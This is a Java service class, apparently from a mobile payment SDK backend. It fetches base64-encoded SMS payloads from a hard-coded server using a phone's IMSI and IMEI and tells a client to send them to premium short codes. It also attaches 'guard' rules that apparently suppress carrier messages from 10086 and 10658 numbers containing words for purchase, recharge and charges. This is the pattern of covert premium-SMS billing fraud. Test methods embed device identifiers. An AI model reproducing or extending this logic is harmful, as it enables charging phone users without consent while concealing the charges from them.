package com.jxt.pay.appclient.service.dynamic.net;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.log4j.Logger;
import org.json.JSONObject;

import sun.misc.BASE64Decoder;

import com.jxt.pay.appclient.service.dynamic.pojo.Error;
import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Repeat;
import com.jxt.pay.appclient.service.dynamic.pojo.Sets;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.CommonUtil;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;
import com.jxt.pay.appclient.utils.PostData;
import com.jxt.pay.appclient.utils.SingleXmlUtil;
import com.jxt.pay.handler.BlackMobileHandler;
import com.jxt.pay.handler.MobileInfoHandler;
import com.jxt.pay.handler.PhoneNoRegionHandler;
import com.jxt.pay.helper.BlackMobileHelper;
import com.jxt.pay.pojo.MobileInfo;
import com.jxt.pay.pojo.PhoneNoRegion;

/**
 * 对接南京网游
 * @author leoliu
 *
 */
public class ZztWy1DynamicService implements IDynamicService{

	private static Logger logger = Logger.getLogger(ZztWy1DynamicService.class);

	private static final String TYPE = "zztWy1";
	
	private static final String FIRSTREQUESTMODEL = "imsi={imsi}&imei={imei}&channelid={channelid}&code={code}";
	private static final String SECONDREQUESTMODEL = "imsi={imsi}&imei={imei}&channelid={channelid}&code={code}&contentsid={contentsid}";

	private static final Guard guard1 = new Guard("1065889955","成功|购买",1440,"1",0);
	private static final Guard guard2 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard3 = new Guard("10658","",960,null,1);
	private static final Guard guard4 = new Guard("10086","",960,null,1);
	
	private static final String STATUS_WAIT = "0";
	private static final String STATUS_SUCC = "1";
	
	private static final String THENO_1 = "1";
	private static final String THENO_2 = "2";
	
	private int timeOut = 60;
	private static final String DEST = "1065889923";
	private static final Integer DEFAULTSUCCESSTIMEOUT = 10;
	
	@Override
	public String dynamic(Map<String, String> map) {
		
		String theNo = map.get("theNo");
		
		if(THENO_1.equals(theNo)){
			return firstDynamic(map);
		}else if(THENO_2.equals(theNo)){
			return secondDynamic(map);
		}
		
		return null;
	}
	
	private Map<String, Integer> map1 = new HashMap<String, Integer>();
	
	private String firstDynamic(Map<String,String> map){
		
		String url = map.get("url");
		String xml = null;
		
		if(url != null && url.length() > 0){
			
				
			String imsi = map.get("imsi");
			String imei = map.get("imei");
			String channelid = map.get("channelid");
			String code = map.get("code");
			
			String param = FIRSTREQUESTMODEL.replace("{imsi}", imsi).replace("{imei}", imei).replace("{channelid}", channelid).replace("{code}", code);
		
			String responseJson = GetData.getData(url,param);
			
			xml = parseFirst(responseJson);
			
			String cpparam = map.get("channel");
			
			if(xml == null){
				Integer cnt = map1.get(cpparam);
				
				if(cnt == null){
					cnt = 0;
				}
				
				if(cnt >= 3){
					map1.remove(cpparam);
					xml = DynamicUtils.parseError("598");
				}else{
					cnt ++;
					map1.put(cpparam, cnt);
					
					xml = DynamicUtils.parseWait(10,map);//获取失败
				}
			}else{
				map1.remove(cpparam);
			}
		}
		
		
		return xml;
	}

	/**
	 * {"contentsid":"243546465","num1":"10658422","sms1":"QlVCQFR8SlkzY2puOXM4OWRCTzBEOFdAMk1HRkZTR0U5RUBBSEkxMkFQOTVAOTY1ODYyODlAODUwODk5ODk4MkAwQDE5MDIyNTg2OTA4Nzc4NkAwNDIwOUA2MDYzODUwNDgzMTAz"}
	 * @param responseXml
	 * @return
	 */
	private String parseFirst(String responseJson){
//		logger.info("parseFirst : "+responseXml);
		if(responseJson != null && responseJson.length() > 0){
			try {
				responseJson = responseJson.replaceAll("\n", "____");
				
				JSONObject jo = new JSONObject(responseJson);
				
				String smsContent = CommonUtil.base64Decode(jo.getString("sms1").replaceAll("____", "\r\n"));
				String num1 = jo.getString("num1");
				
				Sms sms = new Sms();
				sms.setSmsDest(num1);
				sms.setSmsContent(smsContent);
				sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
				
				StringBuffer smsBuffer = XstreamHelper.toXml(sms);
				
				Sets sets = new Sets();
				sets.setKey("contentsid");
				sets.setValue(jo.getString("contentsid"));
				
				StringBuffer setsBuffer = XstreamHelper.toXml(sets);
				
				setsBuffer.append(smsBuffer);
				
				return setsBuffer.toString();
			} catch (Exception e) {
				e.printStackTrace();
			}
			
		}
		
		return null;
	}

	//记录重复请求
	private Map<String, Long> tryMap = new HashMap<String, Long>();
	
	private String secondDynamic(Map<String,String> map){
		String xml = null;
		String url = map.get("url");
		
		String contentsid = map.get("contentsid");
		
		if(url != null && url.length() > 0){
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(contentsid);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(contentsid,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(contentsid);
					return DynamicUtils.parseError("599");
				}
			}
			
			String imsi = map.get("imsi");
			String imei = map.get("imei");
			String channelid = map.get("channelid");
			String code = map.get("code");
			
			String param = SECONDREQUESTMODEL.replace("{contentsid}", contentsid).replace("{imsi}", imsi).replace("{imei}", imei).replace("{channelid}", channelid).replace("{code}", code);
			
			logger.info("secondDynamic : "+param);
			
			String responseTxt =  GetData.getData(url,param);
		
			xml = parseSecond(map,responseTxt);
		}
		
		if(xml == null){
			xml = DynamicUtils.parseWait(10,map);//获取失败
//			tryMap.remove(content_sid);
		}
		
		return xml;
	}
		
	private String parseSecond(Map<String,String> map,String responseTxt){
		
//		logger.info("parse second : "+responseTxt);
		
		if(responseTxt != null && responseTxt.length() > 0){
			
			if(STATUS_WAIT.equals(responseTxt) || "502".equals(responseTxt)){//等待
				return DynamicUtils.parseWait(10,map);
			}else{ 
				tryMap.remove(map.get("content_sid"));
				
				if(responseTxt.length() > 10){
					return parseSecondSucc(map,responseTxt);
				}else{
					return DynamicUtils.parseError(responseTxt);
				}
			}
		}
		
		return null;
	}
	
	private String parseSecondSucc(Map<String,String> map,String responseTxt){
//		logger.info("parse second succ : "+responseTxt);
		
		try{
			List<Sms> smsList = new ArrayList<Sms>();
			
			Sms sms = new Sms();
			
			sms.setSmsContent(CommonUtil.base64Decode(responseTxt));
			sms.setSmsDest(DEST);
			sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
			
			smsList.add(sms);
			
			Sms guardSms = new Sms();
			
			List<Guard> guardList = new ArrayList<Guard>();
			
			guardList.add(guard1);
			guardList.add(guard2);
			guardList.add(guard3);
			guardList.add(guard4);
			
			guardSms.setGuardList(guardList);
			
			smsList.add(0, guardSms);
				
			return XstreamHelper.toXml(smsList);
		}catch(Exception e){
			e.printStackTrace();
		}
		
		return null;
	}
	
	@Override
	public String getType() {
		return TYPE;
	}

	public void setTimeOut(int timeOut) {
		this.timeOut = timeOut;
	}
	
	public static void main(String[] args){
		test2();
	}
	
	private static void test1(){
		
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url","http://221.130.14.106:5050/pc_pay_web/combo_game.php");
		map.put("channel","10B101a12341424");
		map.put("imei","869460011612203");
		map.put("imsi", "460025284891073");
		map.put("channelid","2607");
		map.put("code","c1d4573f77632b55c3ad");
		map.put("theNo","1");
		map.put("type","zztWy1");
		
		System.out.println(new ZztWy1DynamicService().dynamic(map));
	}
	
	private static void test2(){
		
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url","http://221.130.14.106:5050/pc_pay_web/combo_content_game.php");
		map.put("channel","10B101a12341424");
		map.put("imei","869460011612203");
		map.put("imsi", "460025284891073");
		map.put("channelid","2607");
		map.put("code","c1d4573f77632b55c3ad");
		map.put("contentsid","pjv5of3805y5ya7s53219g1prq0u8ux09vry904s");
		map.put("theNo","2");
		map.put("type","zztWy1");
		
		System.out.println(new ZztWy1DynamicService().dynamic(map));
	}
	
}
